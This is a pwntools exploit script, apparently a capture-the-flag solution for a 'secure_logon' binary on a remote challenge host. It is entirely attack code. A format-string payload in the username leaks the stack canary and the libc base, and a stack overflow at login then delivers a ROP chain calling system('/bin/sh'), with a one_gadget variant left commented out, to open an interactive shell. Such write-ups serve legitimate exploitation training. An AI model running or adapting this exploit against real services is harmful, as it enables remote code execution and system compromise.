#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host HOST --port 0 ./secure_logon
from pwn import *
import string

# Set up pwntools for the correct architecture
exe = context.binary = ELF('dist/secure_logon_patched')
if args.LOCAL:
    libc = exe.libc
else:
    libc = ELF("dist/lib/x86_64-linux-gnu/libc.so.6")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '031337.xyz'
port = int(args.PORT or 42001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *(login + 205)
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def logout():
    io.sendlineafter(b"Options", b"0")

def login(user, pwd=None):
    io.sendlineafter(b":", user)
    if pwd is not None:
        io.sendlineafter(b":", pwd)

def show_user():
    io.sendlineafter(b"Options", b"1")

def change_username(user):
    io.sendlineafter(b"Options", b"2")
    io.sendlineafter(b"username", user)

leak_user = b"%p." * 15
assert len(leak_user) < 0x40

login(b"user", b"password")
change_username(leak_user)
login(leak_user, b"password")
io.recvuntil(b"Username: ")
leaks = io.recvline().strip().decode().split(".")
canary = int(leaks[9], 0)
libc.address = int(leaks[1], 0) - 1133111
info(hex(canary))
info(hex(libc.address))

r = ROP(libc, badchars=string.whitespace)
r.raw(r.find_gadget(["ret"])[0])
r.system(next(libc.search(b"/bin/sh\x00")))
info(r.dump())

writable = libc.address + 0x219000 + 0x100
GADGET = libc.address + 0xebcf8
info(hex(GADGET))

logout()
## Either of these two works, but on my local testing version, I needed the one_gadget version because of a 0x0d in the address of system
# login(cyclic_find(0x6261616161616169, n=8) * b"\0" + pack(canary) + cyclic_find(0x6161616161616166, n=8)//8 * pack(writable) + pack(GADGET))
login(cyclic_find(0x6261616161616169, n=8) * b"\0" + pack(canary) + cyclic_find(0x6161616161616166, n=8) * b"b" + r.chain())

io.interactive()

